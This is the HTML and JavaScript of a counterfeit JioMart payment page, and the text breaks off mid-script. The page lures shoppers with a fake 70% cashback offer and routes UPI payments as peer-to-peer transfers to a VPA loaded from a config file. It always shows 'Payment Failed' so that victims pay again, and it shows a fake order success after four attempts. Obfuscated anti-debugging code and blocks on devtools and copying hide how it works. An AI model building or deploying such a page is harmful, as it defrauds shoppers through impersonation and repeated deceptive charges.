<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#008ECC">
    
    <link rel="icon" sizes="192x192" type="image/png" href="https://upload.wikimedia.org/wikipedia/en/thumb/5/54/JioMart_logo.svg/1280px-JioMart_logo.svg.png">
    
    <title>JioMart - Payment Options</title>              

    <!-- Premium JioMart Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Poppins:wght@600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'Plus Jakarta Sans', sans-serif; outline: none; }
        
        body, html { height: 100%; background: #f1f5f9; -webkit-user-select: none; user-select: none; overflow-x: hidden; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }

        /* --- PAGE APP WRAPPER --- */
        #app-wrapper {
            max-width: 480px; margin: 0 auto; min-height: 100vh;
            background: #f1f5f9; position: relative;
            animation: slideInRight 0.3s cubic-bezier(0.25, 1, 0.5, 1) forwards;
            opacity: 0; transform: translateX(30px);
            display: flex; flex-direction: column;
        }

        @keyframes slideInRight { to { opacity: 1; transform: translateX(0); } }
        .slide-out-right { animation: slideOutRight 0.3s forwards !important; }
        @keyframes slideOutRight { to { opacity: 0; transform: translateX(30px); } }

        /* --- SWIGGY STYLE HEADER --- */
        .header { 
            background: rgba(0, 142, 204, 0.98); backdrop-filter: blur(8px);
            padding: 0 16px; height: 60px; display: flex; align-items: center; justify-content: space-between; 
            z-index: 100; flex-shrink: 0; box-shadow: 0 2px 15px rgba(0,142,204,0.18); 
            position: sticky; top: 0;
        }
        .header-left { display: flex; align-items: center; gap: 16px; }
        .back-btn { background: transparent; border: none; color: white; font-size: 20px; cursor: pointer; transition: 0.2s; }
        .back-btn:active { transform: scale(0.85); opacity: 0.8; }
        .header-title { font-family: 'Poppins', sans-serif; font-size: 18px; font-weight: 700; color: white; letter-spacing: 0.2px; }
        .secure-badge { background: rgba(255,255,255,0.15); color: white; border: 1px solid rgba(255,255,255,0.2); padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; display: flex; align-items: center; gap: 5px; }

        /* --- CONTENT AREA --- */
        .main-content { flex: 1; overflow-y: auto; padding: 12px 12px 120px; display: none; opacity: 0; transition: opacity 0.3s; }
        .fade-up { opacity: 0; transform: translateY(15px); animation: fadeInUp 0.5s ease forwards; }
        @keyframes fadeInUp { to { opacity: 1; transform: translateY(0); } }
        .delay-1 { animation-delay: 0.08s; }
        .delay-2 { animation-delay: 0.16s; }
        .delay-3 { animation-delay: 0.24s; }

        /* --- SWIGGY STYLE CARDS --- */
        .swiggy-card { background: white; border-radius: 20px; padding: 16px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); border: 1px solid #e2e8f0; margin-bottom: 12px; position: relative; overflow: hidden; }
        
        /* Price Card */
        .price-details { max-height: 0; overflow: hidden; transition: max-height 0.3s ease, opacity 0.2s ease, margin 0.2s; opacity: 0; border-bottom: 1px dashed #e2e8f0; margin-bottom: 0; }
        .price-details.open { max-height: 250px; opacity: 1; margin-bottom: 12px; padding-bottom: 12px; }
        .p-row { display: flex; justify-content: space-between; font-size: 13.5px; color: #64748b; margin-bottom: 10px; font-weight: 600; }
        .p-val { font-weight: 800; color: #1e293b; }
        .p-green { color: #16a34a; }
        .total-row { display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
        .view-dtls { font-size: 14px; font-weight: 800; color: #008ECC; display: flex; align-items: center; gap: 6px; }
        #price-chevron { transition: transform 0.3s ease; }
        .final-amt { font-family: 'Poppins', sans-serif; font-size: 22px; font-weight: 800; color: #0f172a; transition: color 0.3s; }

        /* Offer Card */
        .offer-card { background: linear-gradient(to right, #f0fdf4, #dcfce7); border-color: #bbf7d0; display: flex; justify-content: space-between; align-items: center; }
        .cb-text { font-family: 'Poppins', sans-serif; font-size: 14.5px; font-weight: 800; color: #15803d; position: relative; display: inline-block; }
        .cb-text::after { content: "70% Cashback Applied"; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(120deg, transparent 0%, transparent 25%, rgba(255,255,255, 0.9) 50%, transparent 75%, transparent 100%); background-size: 200% 100%; -webkit-background-clip: text; color: transparent; animation: shine 2s infinite linear; }
        @keyframes shine { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
        .cb-sub { font-size: 11.5px; color: #166534; margin-top: 4px; font-weight: 600; }
        .bank-icons { display: flex; align-items: center; }
        .bank-icon { width: 30px; height: 30px; background: white; border-radius: 50%; padding: 4px; box-shadow: 0 2px 6px rgba(0,0,0,0.08); margin-left: -10px; border: 2px solid #fff; }

        /* Items Card Header (from Swiggy Checkout) */
        .items-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px dashed #e2e8f0; padding-bottom: 14px; margin-bottom: 14px; }
        .items-title { font-size: 16.5px; font-weight: 800; font-family: 'Poppins', sans-serif; color: #0f172a; display: flex; align-items: center; gap: 8px;}
        .items-sub { font-size: 12px; color: #64748b; font-weight: 600; font-family: 'Plus Jakarta Sans', sans-serif;}

        /* Payment Options */
        .pay-option { display: flex; align-items: center; justify-content: space-between; padding: 14px 0; border-bottom: 1px dashed #f1f5f9; cursor: pointer; transition: 0.2s; }
        .pay-option:last-child { border-bottom: none; padding-bottom: 0; }
        .pay-option:active { transform: scale(0.98); }
        
        .opt-left { display: flex; align-items: center; gap: 14px; }
        .opt-img { width: 36px; height: 36px; object-fit: contain; }
        .opt-name { font-size: 15px; font-weight: 800; color: #1e293b; display: block; }
        .opt-tag { font-size: 10px; font-weight: 800; color: #16a34a; background: #dcfce7; padding: 3px 6px; border-radius: 4px; letter-spacing: 0.3px; border: 1px solid #bbf7d0;}
        
        /* Swiggy Radio */
        .radio-circle { width: 22px; height: 22px; border: 2px solid #cbd5e1; border-radius: 50%; position: relative; display: flex; align-items: center; justify-content: center; transition: border-color 0.2s; }
        .pay-option.selected .radio-circle { border-color: #008ECC; }
        .radio-dot { width: 12px; height: 12px; background: #008ECC; border-radius: 50%; transform: scale(0); transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .pay-option.selected .radio-dot { transform: scale(1); }

        /* Disabled Options */
        .d-opt { padding: 14px 0; border-bottom: 1px dashed #f1f5f9; display: flex; align-items: center; gap: 16px; opacity: 0.5; filter: grayscale(1); }
        .d-opt:last-child { border-bottom: none; padding-bottom: 0; }
        .d-icon { width: 36px; text-align: center; font-size: 18px; color: #64748b; }
        .d-text { flex: 1; font-size: 14.5px; font-weight: 700; color: #333; }
        .d-badge { font-size: 10px; background: #e2e8f0; color: #475569; padding: 4px 8px; border-radius: 6px; font-weight: 800; letter-spacing: 0.5px; }

        /* --- PREMIUM SWIGGY STYLE STICKY FOOTER --- */
        .sticky-footer {
            position: absolute; bottom: 0; left: 0; right: 0; 
            background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(12px); 
            padding: 12px 16px env(safe-area-inset-bottom, 16px); 
            box-shadow: 0 -8px 25px rgba(0,0,0,0.08); z-index: 200; 
            display: flex; flex-direction: column; gap: 10px;
            border-radius: 24px 24px 0 0; border-top: 1px solid rgba(226, 232, 240, 0.8);
        }

        .place-btn {
            background: linear-gradient(135deg, #008ECC, #00a8e8); color: white; border: none; height: 54px; border-radius: 16px;
            font-size: 16.5px; font-weight: 800; font-family: 'Poppins', sans-serif;
            box-shadow: 0 6px 15px rgba(0,142,204,0.3); cursor: pointer;
            display: flex; align-items: center; justify-content: center; gap: 8px;
            width: 100%; transition: 0.2s; position: relative; overflow: hidden;
        }
        .place-btn:active { transform: scale(0.97); box-shadow: 0 2px 8px rgba(0,142,204,0.2); }
        .place-btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%; background: linear-gradient(to right, transparent, rgba(255,255,255,0.3), transparent); transform: skewX(-25deg); animation: btnShineFlash 3s infinite; }
        @keyframes btnShineFlash { 0% { left: -100%; } 20%, 100% { left: 200%; } }
        
        .secure-ftr { text-align: center; font-size: 12px; color: #64748b; font-weight: 700; display: flex; justify-content: center; align-items: center; gap: 6px; }

        /* --- EXACT SWIGGY SKELETON CSS --- */
        #swiggy-skeleton { position: absolute; top: 60px; left: 0; width: 100%; height: calc(100vh - 60px); background: #f1f5f9; z-index: 50; transition: opacity 0.3s; padding: 12px; }
        ._3glbN,._3M8ET,._28QW2{display:flex}._3glbN{flex-direction:column}._28QW2{align-items:center}._3M8ET{justify-content:space-between}._2N8Fo,._3q3vn,._1Udg7,.jRj4T,._2jEOP,._1FPAX,._1Foa2,._1vnlb,._1yZ-n,._2z6q3,.c2Q5x,._3l22M,.j7vjA{background:linear-gradient(.25turn,transparent,#fff,transparent),linear-gradient(#f8fafc,#f8fafc),radial-gradient(38px circle at 19px 19px,#f8fafc 50%,transparent 51%),linear-gradient(#f8fafc,#f8fafc);background-color:#fff;background-repeat:no-repeat;position:relative;animation:_3Jt2b 1.5s infinite;border-radius:12px 16px 12px 12px}._1nwrD{width:100%;height:36px;border-radius:4px}._3q3vn,.c2Q5x,._3l22M,.j7vjA{border-radius:4px}._2N8Fo,.jRj4T,._2jEOP,._1Foa2,._1vnlb,._1yZ-n{height:12px;border-radius:4px}.j7vjA{width:20px;height:20px}._3l22M{width:48px;height:48px;min-width:48px}.c2Q5x{width:72px;height:72px;border-radius:8px}._1yZ-n{width:7vw}._1Foa2{width:10vw}._2jEOP{width:16vw}.jRj4T{width:25vw}._1vnlb{width:32vw}._1FPAX{width:18vw;height:28px;border-radius:8px}._1Udg7{width:24px;height:24px;border-radius:100%}._3glbN{justify-content:space-between;background:#fff;padding:16px;border-radius:20px;margin-bottom:12px;box-shadow:0 4px 15px rgba(0,0,0,0.03)}._2ylBa,._38J-8{display:flex;flex-direction:row;gap:12px;align-items:center;margin:0}._2_YPs{justify-content:space-between;width:100%;margin-bottom:16px}._2ylBa{gap:16px}._2YM_X{margin-bottom:16px}._2euhv,._3Iw_1,._2-Y2W,._2AiXL{display:flex;flex-direction:column;gap:0}._2-Y2W{gap:4px}._2AiXL{gap:8px}._3Iw_1{gap:16px}._4qAl2,._1Qm2Y,._1nCXH,._118lu{display:flex;flex-direction:row;gap:0}._1nCXH{gap:8px}._1Qm2Y{gap:16px}._118lu{justify-content:space-between}._3P6v0{width:100%}._1SCqM{display:flex;flex-direction:row;gap:16px;align-items:center;overflow:hidden}._2RXHJ{display:flex;flex-direction:column;gap:3px;flex:0 0 auto}
        @keyframes _3Jt2b{to{background-position:315px 0,0 0,15px 140px,65px 145px}}

        /* Redirect Toast */
        .redirect-toast {
            position: fixed; bottom: 120px; left: 50%; transform: translate(-50%, 40px);
            background: rgba(15, 23, 42, 0.95); color: white; padding: 14px 24px; border-radius: 30px;
            font-size: 13.5px; font-weight: 700; box-shadow: 0 10px 30px rgba(0,0,0,0.25);
            display: flex; align-items: center; gap: 10px; opacity: 0; pointer-events: none;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 105; backdrop-filter: blur(5px);
            white-space: nowrap;
        }
        .redirect-toast.show { opacity: 1; transform: translate(-50%, 0); }

        /* Price Flash Animation */
        .price-pop-anim { animation: pricePop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards !important; display: inline-block; }
        @keyframes pricePop { 0% { transform: scale(1); color: inherit; } 50% { transform: scale(1.15); color: #008ECC; } 100% { transform: scale(1); color: inherit; } }

        /* --- MODALS (Premium Blur & Pop) --- */
        .overlay { position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 480px; height: 100%; background: rgba(15, 23, 42, 0.6); backdrop-filter: blur(3px); z-index: 200; display: none; opacity: 0; transition: opacity 0.25s ease; will-change: opacity; }
        .overlay.active { display: block; opacity: 1; }
        
        .modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -40%) scale(0.9); background: white; width: 85%; max-width: 340px; border-radius: 24px; padding: 30px 24px; text-align: center; opacity: 0; pointer-events: none; transition: 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 201; box-shadow: 0 20px 40px rgba(0,0,0,0.2); will-change: transform, opacity; }
        .modal.active { opacity: 1; pointer-events: auto; transform: translate(-50%, -50%) scale(1); }

        .premium-spinner { width: 50px; height: 50px; margin: 0 auto 20px; position: relative; }
        .premium-spinner::before, .premium-spinner::after { content: ""; position: absolute; border-radius: 50%; top: 0; left: 0; width: 100%; height: 100%; border: 3.5px solid transparent; }
        .premium-spinner::before { border-top-color: #008ECC; border-bottom-color: #008ECC; animation: spin1 1.2s linear infinite; }
        .premium-spinner::after { border-left-color: #00a8e8; border-right-color: #00a8e8; animation: spin2 0.8s ease-in-out infinite alternate; }
        @keyframes spin1 { 100% { transform: rotate(360deg); } }
        @keyframes spin2 { 100% { transform: rotate(-360deg) scale(0.8); } }

        .modal-title { font-size: 18.5px; font-weight: 800; color: #0f172a; margin-bottom: 10px; }
        .modal-desc { font-size: 13.5px; color: #64748b; line-height: 1.6; margin-bottom: 24px; font-weight: 600; }
        .warning-box { background: #fffbeb; color: #b45309; font-size: 12.5px; padding: 12px; border-radius: 10px; border: 1.5px solid #fde68a; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; }
        
        .qr-container { background: white; padding: 12px; border: 1.5px solid #e2e8f0; border-radius: 12px; display: inline-block; margin-bottom: 16px; }
        .qr-img { width: 180px; height: 180px; object-fit: contain; }
        
        .cross-circle { width: 60px; height: 60px; background: #fef2f2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; color: #ef4444; font-size: 28px; border: 2px solid #fca5a5; animation: shake-modal 0.4s cubic-bezier(.36,.07,.19,.97) both; }
        @keyframes shake-modal { 10%, 90% { transform: translate3d(-1px, 0, 0); } 20%, 80% { transform: translate3d(2px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-4px, 0, 0); } 40%, 60% { transform: translate3d(4px, 0, 0); } }
        
        .check-circle { width: 65px; height: 65px; background: linear-gradient(135deg, #22c55e, #16a34a); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; color: white; font-size: 30px; box-shadow: 0 10px 20px rgba(34, 197, 94, 0.3); animation: popScale 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        @keyframes popScale { 0% { transform: scale(0); } 100% { transform: scale(1); } }

        .retry-btn { background: #0f172a; color: white; width: 100%; padding: 14px; border: none; border-radius: 12px; font-weight: 800; font-size: 15.5px; cursor: pointer; transition: transform 0.15s ease; will-change: transform; }
        .retry-btn:active { transform: scale(0.96); }
        
        .success-summary { background: #f8fafc; border-radius: 14px; padding: 16px; margin-bottom: 20px; text-align: left; border: 1.5px solid #e2e8f0; }
        .s-row { display: flex; justify-content: space-between; font-size: 13.5px; margin-bottom: 8px; color: #64748b; font-weight: 600; }
        .s-row:last-child { margin-bottom: 0; }
        .s-val { font-weight: 800; color: #1e293b; }
        .contact-msg { color: #008ECC; font-size: 13.5px; font-weight: 800; background: #f0f9ff; padding: 12px; border-radius: 10px; border: 1.5px dashed #bae6fd; }
    </style>
</head>

<body oncontextmenu="return false;">

    <!-- REDIRECT TOAST -->
    <div id="redirect-toast" class="redirect-toast">
        <i class="fa-solid fa-shield-halved"></i> Redirecting to Secure Gateway...
    </div>

    <div id="app-wrapper">
        
        <!-- HEADER (Exact match with Checkout) -->
        <header class="header">
            <div class="header-left">
                <button class="back-btn" onclick="goBack()"><i class="fa-solid fa-arrow-left"></i></button>
                <span class="header-title">Payment Options</span>
            </div>
            <div class="secure-badge"><i class="fa-solid fa-shield-halved"></i> 100% Secure</div>
        </header>

        <!-- 1. EXACT SWIGGY SKELETON ANIMATION -->
        <div id="swiggy-skeleton">
            <div class="_3glbN _2YM_X _38J-8 _2_YPs"><div class="_2AiXL _3P6v0"><div class="_118lu"><div class="_1nCXH"><div class="_3l22M" style="width:34px; height:34px; min-width:34px; border-radius:8px;"></div><div class="_2-Y2W"><div class="jRj4T"></div><div class="_1Foa2"></div></div></div><div class="_1Qm2Y"><div class="_1yZ-n"></div></div></div></div></div>
            <div class="_3glbN _2YM_X"><div class="_2AiXL"><div class="_1vnlb"></div><div class="_1SCqM"><div class="_2RXHJ"><div class="c2Q5x" style="width:34px; height:34px; border-radius:50%;"></div><div class="_2AiXL"><div class="_2jEOP"></div></div></div><div class="_2RXHJ"><div class="c2Q5x" style="width:34px; height:34px; border-radius:50%;"></div><div class="_2AiXL"><div class="_2jEOP"></div></div></div></div></div></div>
            <div class="_3glbN _2YM_X _38J-8 _2_YPs"><div class="_3Iw_1 _3P6v0"><div class="_1vnlb"></div><div class="_38J-8 _2_YPs"><div class="_38J-8"><div class="j7vjA" style="width:34px; height:34px; border-radius:8px;"></div><div class="_1vnlb"></div></div><div class="_1Udg7"></div></div><div class="_38J-8 _2_YPs"><div class="_38J-8"><div class="j7vjA" style="width:34px; height:34px; border-radius:8px;"></div><div class="_1vnlb"></div></div><div class="_1Udg7"></div></div><div class="_38J-8 _2_YPs"><div class="_38J-8"><div class="j7vjA" style="width:34px; height:34px; border-radius:8px;"></div><div class="_1vnlb"></div></div><div class="_1Udg7"></div></div></div></div>
        </div>

        <!-- 2. ACTUAL PAYMENT UI -->
        <main class="main-content no-scrollbar" id="actual-payment-ui">
            
            <!-- PRICE CARD -->
            <div class="swiggy-card fade-up">
                <div class="price-details" id="price-details">
                    <div class="p-row"><span>Total MRP</span><span class="mrp-price">₹0</span></div>
                    <div class="p-row"><span>Discount on MRP</span><span class="p-val p-green discount-amt">-₹0</span></div>
                    <div class="p-row"><span>Delivery Charges</span><span class="p-val p-green">FREE</span></div>
                </div>
                <div class="total-row" onclick="togglePrice()">
                    <div class="view-dtls">View Details <i class="fa-solid fa-chevron-down" id="price-chevron"></i></div>
                    <div class="final-amt" id="header-amt">₹0</div>
                </div>
            </div>

            <!-- OFFER CARD -->
            <div class="swiggy-card offer-card fade-up delay-1">
                <div>
                    <div class="cb-text">70% Cashback Applied</div>
                    <div class="cb-sub">Instant cashback on UPI payment</div>
                </div>
                <div class="bank-icons">
                    <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/banks/AXIS.svg" class="bank-icon">
                    <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/banks/SBI.svg" class="bank-icon">
                </div>
            </div>

            <!-- UPI PAYMENT OPTIONS -->
            <div class="swiggy-card fade-up delay-2">
                <div class="items-header">
                    <div class="items-title">
                        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/upi.svg" style="height: 20px;"> 
                        <div>
                            Recommended
                            <div class="items-sub">Pay via UPI for instant cashback</div>
                        </div>
                    </div>
                </div>

                <div class="pay-option selected" onclick="selectMethod('phonepe', this)">
                    <div class="opt-left">
                        <img src="https://img.icons8.com/color/96/phone-pe.png" class="opt-img" style="background:#f1f5f9; padding:4px; border-radius:8px;">
                        <div><span class="opt-name">PhonePe</span><span class="opt-tag"><i class="fa-solid fa-bolt-lightning"></i> Fastest</span></div>
                    </div>
                    <div class="radio-circle"><div class="radio-dot"></div></div>
                </div>

                <div class="pay-option" onclick="selectMethod('paytm', this)">
                    <div class="opt-left">
                        <img src="https://img.icons8.com/color/96/paytm.png" class="opt-img" style="background:#f1f5f9; padding:4px; border-radius:8px;">
                        <span class="opt-name">Paytm UPI</span>
                    </div>
                    <div class="radio-circle"><div class="radio-dot"></div></div>
                </div>

                <div class="pay-option" onclick="selectMethod('qr_upi', this)">
                    <div class="opt-left">
                        <div style="width:36px; height:36px; background:#e0f2fe; border-radius:8px; display:flex; align-items:center; justify-content:center; border: 1px solid #bae6fd;">
                            <i class="fa-solid fa-qrcode" style="color:#008ECC; font-size: 18px;"></i>
                        </div>
                        <span class="opt-name">Scan QR Code</span>
                    </div>
                    <div class="radio-circle"><div class="radio-dot"></div></div>
                </div>
            </div>

            <!-- DISABLED OPTIONS -->
            <div class="swiggy-card fade-up delay-3" style="opacity: 0.6;">
                <div class="d-opt"><div class="d-icon"><i class="fa-regular fa-credit-card"></i></div><div class="d-text">Credit / Debit Card</div><div class="d-badge">UNAVAILABLE</div></div>
                <div class="d-opt"><div class="d-icon"><i class="fa-solid fa-building-columns"></i></div><div class="d-text">Net Banking</div><div class="d-badge">UNAVAILABLE</div></div>
                <div class="d-opt"><div class="d-icon"><i class="fa-solid fa-money-bill-wave"></i></div><div class="d-text">Cash on Delivery</div><div class="d-badge">UNAVAILABLE</div></div>
            </div>
            
        </main>

        <!-- SWIGGY STYLE STICKY BOTTOM DOCK -->
        <div class="sticky-footer" id="sticky-bottom-bar" style="display:none;">
            <button class="place-btn" onclick="initiatePayment()">
                Pay Securely <span id="btn-amount" style="margin-left: 4px;">...</span> <i class="fa-solid fa-chevron-right" style="font-size:13px;"></i>
            </button>
            <div class="secure-ftr"><i class="fa-solid fa-lock" style="font-size: 11px; color: #10b981;"></i> 100% Safe & Secure Payment</div>
        </div>
    </div>

    <!-- MODALS -->
    <div class="overlay" id="overlay"></div>

    <div class="modal" id="waitingModal">
        <div class="premium-spinner"></div>
        <h3 class="modal-title">Processing Payment</h3>
        <p class="modal-desc">Request sent to your UPI app.<br>Please approve the payment to complete order.</p>
        <div class="warning-box"><i class="fa-solid fa-triangle-exclamation"></i> Do not press back or close app</div>
    </div>

    <div class="modal" id="qrModal">
        <div style="text-align: right;"><i class="fa-solid fa-xmark" onclick="closeModal('qrModal')" style="font-size: 20px; color: #94a3b8; cursor: pointer; padding: 5px;"></i></div>
        <h3 class="modal-title">Scan QR with any App</h3>
        <div class="qr-container"><img id="qrImage" src="" class="qr-img"></div>
        <div class="final-amt" id="qr-amt" style="color: #008ECC;">...</div>
    </div>

    <div class="modal" id="failedModal">
        <div class="cross-circle"><i class="fa-solid fa-xmark"></i></div>
        <h3 class="modal-title">Payment Failed</h3>
        <p class="modal-desc">Transaction declined by your bank. Any deducted amount will be securely auto-refunded within 24 hours.</p>
        <button class="retry-btn" onclick="closeModal('failedModal')">Try Again</button>
    </div>

    <div class="modal" id="successModal">
        <div class="check-circle"><i class="fa-solid fa-check"></i></div>
        <h3 class="modal-title" style="color:#16a34a;">Order Placed Successfully!</h3>
        <div class="success-summary">
            <div class="s-row"><span>Order ID:</span><span class="s-val" id="suc-oid">#JM...</span></div>
            <div class="s-row"><span>Date:</span><span class="s-val" id="suc-date">...</span></div>
            <div class="s-row"><span>Amount Paid:</span><span class="s-val" id="suc-amt" style="color:#16a34a;">...</span></div>
            <div class="s-row"><span>Payment:</span><span class="s-val">Verified via UPI</span></div>
        </div>
        <div class="contact-msg"><i class="fa-solid fa-motorcycle"></i> Delivery agent will contact you shortly.</div>
    </div>

    <script>
        // --- 0. STRICT SECURITY ENGINES ---
        document.addEventListener("contextmenu", e => e.preventDefault());
        document.addEventListener("keydown", function(e) {
            if (e.keyCode == 123) return false;
            if (e.ctrlKey && e.shiftKey &&['I','J','C'].includes(String.fromCharCode(e.keyCode))) return false;
            if (e.ctrlKey && ['U','S'].includes(String.fromCharCode(e.keyCode))) return false;
        });
        document.addEventListener('copy', e => e.preventDefault());
        document.addEventListener('cut', e => e.preventDefault());
        document.addEventListener('paste', e => e.preventDefault());
        setInterval(() => { let _0x2a=["\x64\x65\x62\x75\x67\x67\x65\x72"]; (function(){eval(_0x2a[0]);})(); }, 100);

        // --- 1. PERFECT NATIVE NAVIGATION ---
        function goBack() {
            if(navigator.vibrate) navigator.vibrate(15);
            document.getElementById('app-wrapper').classList.add('slide-out-right');
            setTimeout(() => { history.back(); }, 280);
        }

        window.addEventListener('pageshow', () => {
            document.getElementById('app-wrapper').classList.remove('slide-out-right');
            closeModal('waitingModal');
            closeModal('failedModal');
        });

        // --- GLOBAL CART SYNC ENGINE ---
        window.addEventListener("storage", function(event) {
            if (event.key === 'jm_order_final' || event.key === 'jm_order_data') {
                calculatePrices(true); // True indicates it's an auto-update to flash UI
            }
            if (event.key === 'jm_premium_cart') {
                let cartData = JSON.parse(event.newValue || '{}');
                // Security Measure: If user empties cart from another tab, redirect back immediately
                if(Object.keys(cartData).length === 0) {
                    goBack();
                }
            }
        });

        // --- 2. INIT & LOAD DATA ---
        window.onload = function() {
            fetchSettings();
            calculatePrices(false);
            
            // Premium Skeleton Delay (Exact Match with Checkout flow)
            setTimeout(() => {
                document.getElementById('swiggy-skeleton').style.opacity = '0';
                document.getElementById('actual-payment-ui').style.display = 'block';
                document.getElementById('sticky-bottom-bar').style.display = 'flex';
                
                setTimeout(() => {
                    document.getElementById('swiggy-skeleton').style.display = 'none';
                    document.getElementById('actual-payment-ui').style.opacity = '1';
                }, 300);
            }, 1000); 
        };

        // --- 3. CONFIG & LOGIC ---
        const API_URL = '../api.php'; 
        let MERCHANT_UPI = "default@ybl";
        let MERCHANT_NAME = "JioMart Online";
        let TXN_PREFIX = "JioMart_Order";
        let currentMethod = 'phonepe';
        let finalAmount = 136; 
        let TXN_ID = "JioMart_Order" + Date.now();
        let attemptCount = parseInt(localStorage.getItem('jm_pay_attempts') || '0');

        async function fetchSettings() {
    try {
        const response = await fetch(`../info.json?t=${Date.now()}`);
        const data = await response.json();

        // UPI info.json ke "name" se aayega
        if (data.name) {
            MERCHANT_UPI = data.name;
        }

        // Merchant display name agar alag field ho
        if (data.merchant_name) {
            MERCHANT_NAME = data.merchant_name;
        }

        if (data.prefix) {
            TXN_PREFIX = data.email;
        }

        TXN_ID = TXN_PREFIX + Date.now();
    } catch (error) {
        console.error(error);
    }
}

        function calculatePrices(isUpdate = false) {
            const storedOrder = localStorage.getItem('jm_order_final');
            let mrp = 0; let discount = 0;

            if (storedOrder) {
                try {
                    const orderData = JSON.parse(storedOrder);
                    let txt = orderData.total || "136";
                    finalAmount = parseFloat(txt.replace(/[^\d.]/g, ''));
                    if(isNaN(finalAmount)) finalAmount = 136;
                    
                    let sav = orderData.savings || "0";
                    discount = parseFloat(sav.replace(/[^\d.]/g, ''));
                    if(isNaN(discount)) discount = Math.floor(finalAmount * 0.4);

                    mrp = finalAmount + discount;
                } catch(e) { finalAmount = 495; mrp = 600; discount = 105; }
            } else {
                finalAmount = 495; mrp = 600; discount = 105; 
            }
            
            const headAmt = document.getElementById('header-amt');
            const btnAmt = document.getElementById('btn-amount');
            
            headAmt.innerText = '₹' + finalAmount;
            btnAmt.innerText = '₹' + finalAmount;
            document.querySelector('.mrp-price').innerText = '₹' + mrp;
            document.querySelector('.discount-amt').innerText = '-₹' + discount;
            document.getElementById('qr-amt').innerText = '₹' + finalAmount;

            // Flash animation if updated from background tab
            if(isUpdate) {
                headAmt.classList.remove('price-pop-anim');
                void headAmt.offsetWidth;
                headAmt.classList.add('price-pop-anim');
            }
        }

        function togglePrice() {
            if(navigator.vibrate) navigator.vibrate(10);
            document.getElementById('price-details').classList.toggle('open');
            document.getElementById('price-chevron').style.transform = document.getElementById('price-details').classList.contains('open') ? 'rotate(180deg)' : 'rotate(0deg)';
        }

        function selectMethod(method, element) {
            if(navigator.vibrate) navigator.vibrate(15);
            currentMethod = method;
            document.querySelectorAll('.pay-option').forEach(el => el.classList.remove('selected'));
            element.classList.add('selected');
        }

        function showModal(id) {
            const overlay = document.getElementById('overlay');
            const modal = document.getElementById(id);
            overlay.classList.add('active');
            setTimeout(() => modal.classList.add('active'), 10);
        }

        function closeModal(id) {
            if(navigator.vibrate) navigator.vibrate(15);
            const modal = document.getElementById(id);
            const overlay = document.getElementById('overlay');
            modal.classList.remove('active');
            setTimeout(() => overlay.classList.remove('active'), 250);
        }

        // --- 4. PAYMENT INITIATION LOGIC ---
        function initiatePayment() {
            if(navigator.vibrate) navigator.vibrate([20, 30]);

            if (attemptCount >= 4) { triggerSuccess(); return; }

            attemptCount++;
            localStorage.setItem('jm_pay_attempts', attemptCount);

            if (currentMethod === 'qr_upi') { generateQR(); return; }

            const toast = document.getElementById('redirect-toast');
            toast.classList.add('show');

            const amount = finalAmount.toString();
            const upi = MERCHANT_UPI;
            const tn = TXN_ID;
            const pn = encodeURIComponent(MERCHANT_NAME); 
            
            setTimeout(() => {
                toast.classList.remove('show');
                showModal('waitingModal');

                setTimeout(() => {
                    if (currentMethod === 'paytm') {
                        window.location.href = `paytmmp://cash_wallet?pa=${upi}&pn=${pn}&am=${amount}&cu=INR&tn=${tn}&featuretype=money_transfer`;
                    }
                    else if (currentMethod === 'phonepe') {
                        let payload = {
                            "contact": { "cbcName": MERCHANT_NAME, "nickName": MERCHANT_NAME, "vpa": upi, "type": "VPA" },
                            "p2pPaymentCheckoutParams": {
                                "note": tn, "isByDefaultKnownContact": true, "initialAmount": parseInt(amount) * 100, "currency": "INR", "checkoutType": "DEFAULT", "transactionContext": "p2p"
                            }
                        };
                        let base64Data = btoa(JSON.stringify(payload));
                        window.location.href = "phonepe://native?data=" + base64Data + "&id=p2ppayment";
                    }

                    setTimeout(() => {
                        document.getElementById('waitingModal').classList.remove('active');
                        setTimeout(() => document.getElementById('failedModal').classList.add('active'), 250);
                    }, 5000); 

                }, 600);
            }, 800); 
        }

        function triggerSuccess() {
            showModal('waitingModal');
            
            const date = new Date();
            const options = { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' };
            document.getElementById('suc-date').innerText = date.toLocaleDateString('en-US', options);
            document.getElementById('suc-oid').innerText = "#JioMart_Order" + Math.floor(10000 + Math.random() * 90000);
            document.getElementById('suc-amt').innerText = '₹' + finalAmount;

            setTimeout(() => {
